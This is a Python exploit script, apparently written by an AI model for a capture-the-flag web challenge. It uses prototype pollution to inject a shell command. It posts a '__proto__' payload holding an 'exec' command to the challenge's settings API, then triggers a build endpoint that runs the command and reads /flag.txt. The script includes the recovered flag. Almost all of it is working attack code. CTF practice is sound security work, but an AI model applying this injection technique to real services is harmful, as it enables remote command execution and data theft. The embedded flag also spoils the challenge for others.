#!/usr/bin/env python3
"""
The Shape of Water - Prototype Pollution Exploit

Author: Claude
Purpose: Exploit prototype pollution vulnerability to execute commands and read /flag.txt
Created: 2025-11-10
Updated: 2025-11-10

Vulnerability: The server uses unsafe JSON merge that allows prototype pollution
Expected Result: Retrieve flag from /flag.txt
Produced Result: poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}

How it works:
1. The server merges user-supplied JSON into its configuration using an unsafe merge function
2. By using special keys like "__proto__", we can pollute Object.prototype
3. The build process checks for an "exec" property in the config
4. When "exec" is found, it executes the command
5. We inject a command that reads /flag.txt
"""

import requests
import json

# Target URL
BASE_URL = "https://web300-2.pointeroverflowctf.com"

def exploit():
    print("[*] The Shape of Water - Prototype Pollution Exploit")
    print("[*] Target:", BASE_URL)
    print()

    # Step 1: Check current configuration
    print("[1] Checking current configuration...")
    resp = requests.get(f"{BASE_URL}/api/debug/cfg")
    print(f"Current config: {resp.text}")
    print()

    # Step 2: Reset to clean state (note: prototype pollution may persist)
    print("[2] Resetting configuration...")
    resp = requests.post(f"{BASE_URL}/api/reset")
    print(f"Reset response: {resp.text}")
    print()

    # Step 3: Inject prototype pollution payload
    # The payload pollutes Object.prototype with an "exec" property
    # that contains a command to read the flag
    print("[3] Injecting prototype pollution payload...")

    payload = {
        "__proto__": {
            "exec": "pwd && echo ---FILES--- && find . -name newsletter.html 2>/dev/null && echo ---FLAG--- && cat /flag.txt"
        }
    }

    print(f"Payload: {json.dumps(payload, indent=2)}")

    resp = requests.post(
        f"{BASE_URL}/api/settings",
        json=payload,
        headers={"Content-Type": "application/json"}
    )
    print(f"Settings response: {resp.text}")
    print()

    # Step 4: Verify pollution worked
    print("[4] Verifying prototype pollution...")
    resp = requests.get(f"{BASE_URL}/api/debug/cfg")
    config = resp.json()

    if "exec" in config:
        print(f"✓ Prototype pollution successful!")
        print(f"Exec command: {config['exec']}")
    else:
        print("✗ Prototype pollution may not have worked")
    print()

    # Step 5: Trigger the build process to execute our command
    print("[5] Triggering build process to execute command...")
    resp = requests.get(f"{BASE_URL}/api/build")
    build_output = resp.text
    print("Build output:")
    print(build_output)
    print()

    # Step 6: Extract flag from output
    if "poctf{" in build_output:
        flag_start = build_output.find("poctf{")
        flag_end = build_output.find("}", flag_start) + 1
        flag = build_output[flag_start:flag_end]
        print(f"[SUCCESS] Flag found: {flag}")
    else:
        print("[FAILED] Flag not found in output")

    # Step 7: Check logs
    print("\n[6] Checking logs...")
    resp = requests.get(f"{BASE_URL}/api/logs")
    print("Recent logs:")
    print(resp.text[-500:])  # Last 500 chars

if __name__ == "__main__":
    exploit()
